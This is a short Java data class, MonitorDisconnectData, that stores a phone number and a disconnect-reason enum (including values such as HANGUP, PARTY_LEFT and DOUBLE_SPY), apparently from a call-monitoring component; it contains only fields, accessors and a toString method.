package com.vvt.callmanager.ref;

import java.io.Serializable;

public class MonitorDisconnectData implements Serializable {
	
	private static final long serialVersionUID = -6865786725409344143L;
	
	private String number;
	private Reason reason;
	
	public MonitorDisconnectData(String number, Reason reason) {
		this.number = number;
		this.reason = reason;
	}
	
	public String getNumber() {
		return number;
	}

	public void setNumber(String number) {
		this.number = number;
	}

	public Reason getReason() {
		return reason;
	}

	public void setReason(Reason reason) {
		this.reason = reason;
	}

	public static long getSerialversionuid() {
		return serialVersionUID;
	}
	
	@Override
	public String toString() {
		return String.format("number: %s, reason: %s", number, reason);
	}

	public enum Reason {
		UNKNOWN, 
		DIALING, 
		CALL_WAITING , 
		HANGUP, 
		SWITCH_CALL, 
		PARTY_LEFT, 
		BAD_STATE, // someone in the session is on hold 
		MUSIC_PLAY, 
		DOUBLE_SPY
	}
	
}

